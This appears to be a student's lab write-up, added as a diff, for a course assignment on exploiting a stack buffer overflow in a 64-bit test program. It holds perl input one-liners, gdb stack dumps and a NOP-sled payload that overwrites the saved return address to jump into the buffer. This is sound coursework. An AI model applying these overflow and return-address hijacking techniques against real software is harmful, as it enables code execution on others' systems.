@@ -1,0 +1,64 @@
+Assignemnt 2
+64bit machine
+
+After you compile your program, run it inside a debugger and enter a long enough input resulting in program crash due to an overwritten return address. After the crash, the program stops in the debugger and the EIP register (resp. RIP for the 64-bit mode) will contain a portion of the input. Another portion of the input should be visible in EBP (resp. RBP). Draw the stack frame layout so it is evident where the buffer is allocated, where resides the return address, the input parameters, etc. (1 point) 
+
+
+Input script : perl -e 'print "A"x16;'
+
+0x7fffffffdd00:	0xffffde08	0x00007fff	0x00400490	0x00000001
+0x7fffffffdd10:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffdd20:	0x00000000-	0x00000000-	0xf7a36ec5*	0x00007fff*
+* = return address, 
+- = ebp
+
+Saved registers:
+  rbp at 0x7fffffffdd20, rip at 0x7fffffffdd28
+
+To make the program crach on return the input must be at least 25 bytes. 
+
+Input script : perl -e 'print "A"x25;'
+x/12x $rsp
+0x7fffffffdd00:	0xffffde08	0x00007fff	0x00400490	0x00000001
+0x7fffffffdd10:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffdd20:	0x41414141	0x41414141	0xf7a30041	0x00007fff
+This has overwritten one byte of the saved rip (return address). This will cause the program to crash in best case or may find executable code at the new address and continue execuring. 
+
+
+A portion of the input that ended in EIP allows you to determine the address where the program attempted to return; if it was valid, the program would return to that address and the code present there would get executed. The easiest way to exploit this is, if at all possible, to return the control to a location on the stack located inside the buffer. The EIP on the stack will get overwritten with an address pointing somewhere inside the buffer. If you cannot point EIP precisely, write enough nop instructions (machine code 0x90) before the exploit code so that the execution slides by these nops and eventually reaches the exploit — this is a *nop sled* method. (2 points) 
+
+Input script : perl -e 'print "\x90"x24 . "\x10\xdd\xff\xff" . "\xff\x7f";'
+x/12x $rsp
+0x7fffffffdd00:	0xffffde08	0x00007fff	0x00400490	0x00000001
+0x7fffffffdd10:	0x90909090	0x90909090	0x90909090	0x90909090<--|
+0x7fffffffdd20:	0x90909090	0x90909090	0xffffdd10	0x00007fff>--|
+Saved registers:
+  rbp at 0x7fffffffdd20, rip at 0x7fffffffdd28
+
+The saved rip (return address) is now pointing at 0x7fffffffdd10.
+There is NOP instructions from 0x7fffffffdd10 to 0x7fffffffdd28.
+
+x/5i $rip
+=> 0x4005bd <main+64>:	mov    eax,0x0
+   0x4005c2 <main+69>:	leave  
+   0x4005c3 <main+70>:	ret    
+   0x4005c4:	nop    WORD PTR cs:[rax+rax*1+0x0]
+   0x4005ce:	xchg   ax,ax
+(gdb) nexti
+8	}
+(gdb) nexti
+0x00000000004005c3	8	}
+(gdb) nexti
+0x00007fffffffdd10 in ?? ()
+(gdb) x/5i $rip
+=> 0x7fffffffdd10:	nop
+   0x7fffffffdd11:	nop
+   0x7fffffffdd12:	nop
+   0x7fffffffdd13:	nop
+   0x7fffffffdd14:	nop
+
+
+
+Note that the injected code does not pass through the dynamic loader so it is not possible to call system functions in the traditional way by using call exec. You can, however, use call eax (resp. call rax), where the eax register will point to an address of the desired function such as 0x12345678. If the address of the exec function were 0x12345678, it would be executed. You can set the address either by hard-coding it or by looking up another call in the program binary and copying the address. Find an address of a system function that you would use for your exploit and describe the way you went about it (2 points). 
+
+
